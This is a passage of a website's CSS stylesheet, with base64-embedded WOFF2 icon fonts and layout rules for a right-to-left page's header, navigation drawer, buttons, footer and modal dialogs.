TCJMsrn36ZUsC/NRmaNQYwA8jD+m1KoMzV+CLqq1BK/y4hOrbCHh2/KBmZRa3mCsR+yvcLJixZlRy7n5q67jxKQnyh7pbVBZuks3h6Crj7Y80cMjvhV2n97pXMceznyUMtma0pzUqef7wxufv91cbCeOK9AlAWdg5fpn86arqw4v34djJhJhUFzXYWM/Zs2lfjhdxIyD+Gjud/N0P64XKSygdrTU2rTlM+w5GUcwAL/x/Usby70wDsKFFRSZSC3qnxE/8RRtLvtAtnVF9WZcOawV23eDlDQiF7aSbsM7xpgHhcXNPG0xj90cZpA8yye6jvxBo0sncBbtu4qq7pyA6YAgIoNalo+Eki5rykX/Yx5g3VdGschyUsMtfSv9RIXdKhZeiqYeqOjb11c5t0Oe6j2gZ9SWw62KftjS0ErDP3wmSVIdN1P6uXwKjM1xqwnqZ6kZzMWf2LhH8YwWOYp2MR5tkPzJSWWABb+3SO8TU9reGqzJ1o5gluXuZuF5yf7kpYCvwducdFbXbs52L4AX50d0390ZzPYkfoNlDdUPwvXveQy7VPRtaOGtWwFllBIaSGdhg9tSuX1mJ6pOjVXVA0GnAhFIbfDqRgAUUXtB5r9Qlq5iL9YJ9LtOAH1Q0T4e9wgMuXXFxpVotdi4bd+muZYj1ab3aw38bkb+0wOZv+465OsL6G+ZmLx4xSXxG3WLithPj2UTSWP+P4uUHQ0WszT97nv+LVfstTnj+5PO5MIt3ipaNNtt+VRy9fn0uePiokJ7v+WPZ02bsniEBFbE293i9PuJ9ngMAAAALV0FEPGnb6zP88rbXtCmPPvR8UcS3jeZ+2vqKlIYOhYpYm7G7QwLe7fz43s7vfcLz3zxBjz4UoKLlA9fvzxmFNmMOAFTE2sw7a63d9psjNy57N2Ou6qI4nARUxNr83dP9X5vj/Mw0gIpYm7E7QgIqYm3G7ozpIyIiIiqllFJKKUVERERExMzMzMybPzmqpzfN1sd0M1prrWeBExERERER0YGoaHr2ir8c/beM/nQm3q93Lo7D4VmbTvnLi9W+GbtnSEBFrM3YHSEBFbE2j4329RZ+GWKVct20wZ/IetvJXURERERERERmZmZmZmZmVlVVVVVVVVWzabq6e3r7ppOcf4Q2vU5krQEA)format("woff2");
                font-weight: normal;
                font-style: normal
            }

            @font-face {
                font-family: "Icons";
                src: url(data:font/woff2;base64,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)format("woff2");
                font-weight: normal;
                font-style: normal
            }

            @-webkit-keyframes fa-spin {
                0% {
                    -webkit-transform: rotate(0deg);
                    transform: rotate(0deg)
                }

                100% {
                    -webkit-transform: rotate(359deg);
                    transform: rotate(359deg)
                }
            }

            @keyframes fa-spin {
                0% {
                    -webkit-transform: rotate(0deg);
                    transform: rotate(0deg)
                }

                100% {
                    -webkit-transform: rotate(359deg);
                    transform: rotate(359deg)
                }
            }

            @font-face {
                font-family: "Icons";
                src: url(data:font/woff2;base64,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)format("woff2");
                font-weight: normal;
                font-style: normal
            }

            .ic {
                display: inline-block;
                font: normal normal normal 14px/1 Icons;
                font-size: inherit;
                text-rendering: auto;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
                font-family: "Icons"
            }

            .icon-close:before {
                content: ""
            }

            .icon-user:before {
                content: ""
            }

            .icon-menu:before {
                content: ""
            }

            input[type="text"] {
                padding: 1rem 1.5rem;
                width: 100%;
                max-width: 100%;
                display: block;
                background: none;
                color: #000
            }

            input[type="checkbox"]+label:not(.error),input.checkbox+label:not(.error) {
                position: relative;
                vertical-align: top;
                display: inline-block;
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box
            }

            input[type="checkbox"]+label:not(.error):before,input.checkbox+label:not(.error):before {
                content: "";
                color: ;
                font-size: 1em;
                display: inline-block;
                width: 1em;
                text-align: center;
                font-family: "FontAwesome";
                margin-left: 0.5em
            }

            input[type="checkbox"]:checked+label:not(.error):before,input.checkbox:checked+label:not(.error):before {
                content: "";
                color: ;
                right: 0.1em
            }

            * {
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                -ms-box-sizing: border-box;
                box-sizing: border-box
            }

            html,body {
                background: #fff;
                color: #000;
                height: 100%;
                font-family: "SimplerPro","Arial",Helvetica,sans-serif;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale
            }

            .flexi_wrapper {
                background: #fff;
                min-height: initial
            }

            h2,h3 {
                margin: 0;
                font-family: "SimplerPro","Arial",Helvetica,sans-serif;
                line-height: 1em
            }

            h2,h3 {
                text-transform: uppercase
            }

            h2 {
                margin-bottom: 0.25rem
            }

            @media only screen and (min-width: 767px) {
                img {
                    image-rendering:-webkit-optimize-contrast
                }
            }

            @media only screen and (max-width: 767px) {
            }

            @media only screen and (max-width: 767px) {
            }

            .icon {
                width: auto;
                display: inline-block
            }

            .x2 {
                height: 2rem
            }

            button,.button {
                padding: 1rem 1.5rem;
                white-space: nowrap;
                text-align: center;
                font-family: "SimplerPro","Arial",Helvetica,sans-serif;
                background: var(--bgColor,#2e69e7);
                color: #fff;
                border: 1px solid var(--bgColor,#2e69e7);
                cursor: pointer;
                display: inline-block;
                border-radius: 2em;
                position: relative;
                overflow: hidden;
                min-width: 10em;
                transition: 250ms
            }

            button:hover,button:focus,.button:hover,.button:focus {
                background: none;
                color: #2e69e7
            }

            iframe {
                border: none!important;
                background-color: transparent;
                overflow: hidden;
                width: 100%
            }

            *:focus {
                outline: 0
            }

            .com_accessibility_accesskey {
                position: absolute;
                right: -9000px;
                height: 1px;
                width: 1px;
                overflow: hidden;
                margin: 0;
                padding: 0.5em;
                color: #fff;
                background: #A4A8AB
            }

            .com_accessibility_accesskey:active,.com_accessibility_accesskey:focus {
                z-index: 999999;
                top: 0;
                right: 0;
                height: auto;
                width: auto;
                overflow: visible
            }

            .icon-menu:before {
                font-size: 1.3rem
            }

            .header-sticky {
                height: 5.5rem
            }

            header.header {
                position: fixed;
                top: 0;
                right: 0;
                left: 0;
                z-index: 20;
                background: #fff
            }

            header.header .logo {
                display: block
            }

            header.header .logo img {
                display: block;
                width: auto;
                height: 5.5rem;
                padding: 1.5rem 1rem
            }

            header.header .serach {
                background: #fff;
                padding: .5rem
            }

            header.header .serach input {
                border: 0;
                border-radius: 0
            }

            header.header .m_button {
                padding: 0 .5rem
            }

            header.header .m_button span.text {
                position: relative;
                display: block;
                padding: 1rem 3rem 1rem 1.5rem;
                background: #eef9fb;
                color: #000;
                border-radius: 2rem;
                cursor: pointer
            }

            header.header .m_button span.text>i {
                position: absolute;
                top: 50%;
                transform: translateY(-50%);
                right: 1.5rem;
                color: #2e69e7
            }

            @media only screen and (max-width: 767px) {
                header.header .m_button span.text {
                    padding:1.5rem
                }

                header.header .m_button span.text>i {
                    right: 1rem
                }

                header.header .m_button span.text span {
                    border: 0;
                    clip: rect(0,0,0,0);
                    height: 1px;
                    margin: -1px;
                    overflow: hidden;
                    padding: 0;
                    position: absolute;
                    width: 1px
                }
            }

            header.header .header-content-wrap {
                display: flex;
                align-items: center
            }

            header.header .header-content-wrap .menu-tools-wrap {
                padding: 0 .5rem;
                display: flex;
                flex-grow: 1
            }

            header.header .header-content-wrap .menu-tools-wrap .header-input-nav-toggle+.header-label-nav-toggle::before {
                content: none
            }

            header.header .header-content-wrap .menu-tools-wrap .header-input-nav-toggle+.header-label-nav-toggle+nav {
                position: fixed;
                top: 0;
                right: 0;
                transform: translateX(100%);
                transition: 150ms cubic-bezier(0.25,0.46,0.45,0.94);
                width: 100vw;
                max-width: 32rem;
                z-index: 20;
                padding-left: 5rem
            }

            header.header .header-content-wrap .menu-tools-wrap .header-input-nav-toggle+.header-label-nav-toggle+nav+.header-label-nav-toggle-dim {
                position: fixed;
                top: 0;
                bottom: 0;
                right: 0;
                z-index: 15;
                padding-top: 5rem;
                width: 100%;
                flex-direction: column;
                align-items: center;
                transform: translateX(100%);
                transition: 10ms ease-in-out;
                background: rgba(0,0,0,0.3)
            }

            header.header .header-content-wrap .menu-tools-wrap .header-input-nav-toggle:checked+.header-label-nav-toggle+nav {
                transform: translateX(0)
            }

            header.header .header-content-wrap .menu-tools-wrap .header-input-nav-toggle:checked+.header-label-nav-toggle+nav+.header-label-nav-toggle-dim {
                transform: translateX(0)
            }

            header.header .header-content-wrap .menu-tools-wrap .header-label-close-nav-toggle {
                position: absolute;
                top: 1rem;
                left: 1rem;
                width: 3rem;
                height: 3rem;
                border-radius: 50%;
                background: #fff;
                cursor: pointer;
                display: flex;
                justify-content: center;
                align-items: center
            }

            header.header .header-content-wrap .menu-tools-wrap .header-label-close-nav-toggle>span {
                border: 0;
                clip: rect(0,0,0,0);
                height: 1px;
                margin: -1px;
                overflow: hidden;
                padding: 0;
                position: absolute;
                width: 1px
            }

            header.header .header-content-wrap .menu-tools-wrap .header-label-close-nav-toggle>i {
                color: #2e69e7
            }

            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0 {
                background: #e5ecfc;
                overflow: auto;
                height: var(--wh,100vh)
            }

            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0::-webkit-scrollbar {
                width: 6px
            }

            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0::-webkit-scrollbar-track {
                background: #89abf2
            }

            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0::-webkit-scrollbar-thumb {
                background: #2e69e7
            }

            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0::-webkit-scrollbar-thumb:hover {
                background: #1a5ae2
            }

            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0>li>a {
                position: relative;
                display: block;
                padding: 1.5rem 2rem;
                font-size: 1.2rem;
                background: #e5ecfc;
                border-top: 2px solid #fff
            }

            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0>li:first-child>a {
                border-top: 0
            }

            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0>li.has_childs>a:after {
                content: "+";
                position: absolute;
                top: 50%;
                left: 1rem;
                transform: translateY(-50%) rotate(0deg);
                transform-origin: center;
                transition: 200ms cubic-bezier(0.25,0.46,0.45,0.94)
            }

            @media screen and (min-width: 0\0) and (min-resolution:.001dpcm) {
            }

            @media screen and (max-width: 800px) and (orientation:landscape),screen and (max-height:300px) {
            }

            @media all and (max-width: 900px) {
            }

            article.page {
                background: #fff;
                min-height: calc(100vh - 17rem)
            }

            @media only screen and (max-width: 767px) {
                article.page {
                    min-height:calc(100vh - 31rem)
                }
            }

            article.page .title {
                margin: 1rem 0;
                padding: 0 1rem;
                font-size: 1.6rem;
                font-weight: bold;
                text-align: center
            }

            @media only screen and (max-width: 767px) {
            }

            .content {
                font-family: "SimplerPro","Arial",Helvetica,sans-serif;
                font-weight: lighter;
                width: 100%
            }

            @media only screen and (max-width: 767px) {
            }

            .content h3 {
                font-size: 1em;
                font-weight: bold
            }

            .content p {
                line-height: 1.5em
            }

            .content a {
                text-decoration: underline
            }

            .content p {
                margin-bottom: 1rem;
                margin-top: 1rem
            }

            .content p:first-child {
                margin-top: 0
            }

            .content p:last-child {
                margin: 0
            }

            @media only screen and (max-width: 767px) {
            }

            .mod_form_contact .apps-links-warp {
                padding: 1rem
            }

            .mod_form_contact .apps-links-warp .title {
                color: #000
            }

            .mod_form_contact .apps-links-warp>div {
                background: #fafafa;
                border-radius: 2rem;
                padding: 2rem;
                text-align: center
            }

            footer.footer {
                background: #fafafa
            }

            footer.footer .footer-nav {
                display: flex;
                flex-flow: row wrap;
                align-items: center
            }

            footer.footer .footer-nav>div {
                width: calc(50% - 13rem)
            }

            footer.footer .footer-nav>div ul {
                display: flex;
                flex-flow: row wrap
            }

            footer.footer .footer-nav>div ul li a {
                display: block;
                padding: 1rem
            }

            footer.footer .footer-nav>.footer-nav-right ul {
                justify-content: flex-start
            }

            footer.footer .footer-nav>.footer-nav-left ul {
                justify-content: flex-end
            }

            @media only screen and (max-width: 768px) {
                footer.footer .footer-nav>div {
                    width:100%
                }

                footer.footer .footer-nav>.footer-nav-right ul {
                    justify-content: center
                }

                footer.footer .footer-nav>.footer-nav-right ul li {
                    width: 100%;
                    text-align: center;
                    border-top: 2px solid #fff
                }

                footer.footer .footer-nav>.footer-nav-left ul {
                    justify-content: center
                }

                footer.footer .footer-nav>.footer-nav-left ul li {
                    width: 100%;
                    text-align: center;
                    border-top: 2px solid #fff
                }
            }

            .modal {
                opacity: 0;
                visibility: hidden;
                position: fixed;
                box-sizing: border-box;
                z-index: 9999;
                padding: 1rem;
                top: 0;
                left: 0;
                outline: none;
                overflow: hidden;
                -webkit-backface-visibility: hidden;
                margin: 0 auto;
                width: 100%;
                height: 100%;
                background-color: rgba(0,0,0,0.4);
                transition: 250ms
            }

            .modal .modal_container {
                position: absolute;
                width: 100%;
                height: 100%;
                left: 0;
                top: 0;
                padding: 1rem;
                text-align: right;
                overflow: auto;
                box-sizing: border-box;
                -ms-overflow-style: none;
                scrollbar-width: none
            }

            .modal .modal_container::-webkit-scrollbar {
                display: none
            }

            .modal .modal_container:before {
                content: "";
                display: inline-block;
                height: 100%;
                vertical-align: bottom
            }

            .modal .modal_content {
                position: relative;
                background-color: #fff;
                border-radius: 1rem;
                display: inline-block;
                vertical-align: middle;
                padding: 0;
                width: 30rem;
                max-width: 100%;
                text-align: right;
                overflow: hidden;
